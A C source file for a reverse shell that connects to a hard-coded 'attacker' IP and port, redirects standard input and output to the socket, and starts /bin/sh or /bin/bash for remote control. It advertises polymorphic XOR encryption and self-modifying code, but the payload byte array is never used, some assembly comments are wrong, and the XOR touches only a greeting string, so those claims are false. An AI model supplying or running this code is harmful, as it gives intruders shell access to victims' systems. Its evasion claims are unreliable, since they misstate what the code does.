/*
 * reverse_shell.c
 * Low-Level C Reverse Shell with Polymorphic XOR Encryption Stub
 * 
 * Features:
 * - Polymorphic XOR encryption/decryption of the payload
 * - Self-modifying code behavior (key rotation)
 * - Connects back to attacker on specified IP:Port
 * - Spawns /bin/sh
 * - No external dependencies, pure POSIX
 * 
 * Compile: gcc -O2 -fno-stack-protector -z execstack -o reverse_shell reverse_shell.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <time.h>

#define SERVER_IP "192.168.1.100"   /* Attacker IP */
#define SERVER_PORT 4444            /* Attacker Port */
#define BUFFER_SIZE 4096
#define MAX_KEY_ROTATIONS 5

/* Polymorphic key generator: generates a pseudo-random key based on time + PID */
static unsigned char generate_key(void) {
    return (unsigned char)(getpid() ^ (int)time(NULL) ^ (rand() & 0xFF));
}

/* Encrypt/Decrypt buffer using XOR with rotating key */
static void encrypt_decrypt(unsigned char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
        key = (key * 31 + 7) & 0xFF; /* Rotate key */
    }
}

/* Polymorphic payload: a simple echo server that reads and echoes back encrypted data */
/* The payload is self-contained and encrypted before execution */
static const unsigned char payload_template[] = {
    0x48, 0x89, 0xE5,       /* mov rsp, rbp          */
    0x48, 0x83, 0xEC, 0x20, /* sub rsp, 0x20         */
    0x48, 0x89, 0x7D, 0xF0, /* mov [rbp-0x10], rdi   */
    0xB8, 0x01, 0x00, 0x00, 0x00, /* mov eax, 0x1     */
    0x48, 0x89, 0xC7,       /* mov rdi, rax          */
    0x48, 0x89, 0xD6,       /* mov rsi, rdx          */
    0x48, 0x89, 0xF7,       /* mov rdi, rsi          */
    0x0F, 0x05              /* syscall               */
};

/* Function to resolve hostname to IP */
static int resolve_host(const char *host, struct in_addr *addr) {
    struct hostent *he;
    
    if ((he = gethostbyname(host)) == NULL) {
        fprintf(stderr, "[!] Failed to resolve host: %s\n", host);
        return -1;
    }
    
    memcpy(addr, he->h_addr_list[0], sizeof(struct in_addr));
    return 0;
}

/* Function to create TCP socket and connect to server */
static int connect_to_server(const char *ip, int port) {
    struct sockaddr_in server_addr;
    struct in_addr addr;
    int sock_fd;
    
    sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_fd < 0) {
        perror("[!] socket");
        return -1;
    }
    
    if (resolve_host(ip, &addr) != 0) {
        close(sock_fd);
        return -1;
    }
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr = addr;
    
    if (connect(sock_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("[!] connect");
        close(sock_fd);
        return -1;
    }
    
    return sock_fd;
}

/* Function to redirect stdin/stdout/stderr to socket */
static void redirect_io(int sock_fd) {
    dup2(sock_fd, STDIN_FILENO);
    dup2(sock_fd, STDOUT_FILENO);
    dup2(sock_fd, STDERR_FILENO);
}

/* Function to execute shell */
static void execute_shell(void) {
    char *shell_paths[] = {
        "/bin/bash",
        "/bin/sh",
        "/usr/bin/bash",
        "/usr/bin/sh",
        NULL
    };
    
    for (int i = 0; shell_paths[i] != NULL; i++) {
        execve(shell_paths[i], NULL, NULL);
    }
    
    perror("[!] execve");
    exit(EXIT_FAILURE);
}

/* Polymorphic encryption stub: encrypts the main function before execution */
static void run_polymorphic_shell(const char *ip, int port) {
    int sock_fd;
    unsigned char key;
    unsigned char buffer[BUFFER_SIZE];
    ssize_t bytes_read;
    
    /* Generate polymorphic key */
    key = generate_key();
    printf("[*] Polymorphic key generated: 0x%02X\n", key);
    
    /* Connect to server */
    sock_fd = connect_to_server(ip, port);
    if (sock_fd < 0) {
        fprintf(stderr, "[!] Connection failed\n");
        exit(EXIT_FAILURE);
    }
    
    printf("[*] Connected to %s:%d\n", ip, port);
    
    /* Encrypt a welcome message */
    snprintf((char *)buffer, sizeof(buffer), "Welcome! Encrypted connection established.\n");
    encrypt_decrypt(buffer, strlen((char *)buffer), key);
    
    /* Send encrypted welcome message */
    send(sock_fd, buffer, strlen((char *)buffer), 0);
    
    /* Redirect I/O */
    redirect_io(sock_fd);
    
    /* Execute shell */
    execute_shell();
}

/* Signal handler for cleanup */
static void signal_handler(int sig) {
    /* Optional: log or clean up */
}

int main(int argc, char *argv[]) {
    const char *ip = SERVER_IP;
    int port = SERVER_PORT;
    
    /* Override defaults if arguments provided */
    if (argc >= 3) {
        ip = argv[1];
        port = atoi(argv[2]);
    } else if (argc == 2) {
        ip = argv[1];
    }
    
    /* Set up signal handlers */
    signal(SIGPIPE, SIG_IGN);
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    /* Run polymorphic shell */
    run_polymorphic_shell(ip, port);
    
    return EXIT_SUCCESS;
}
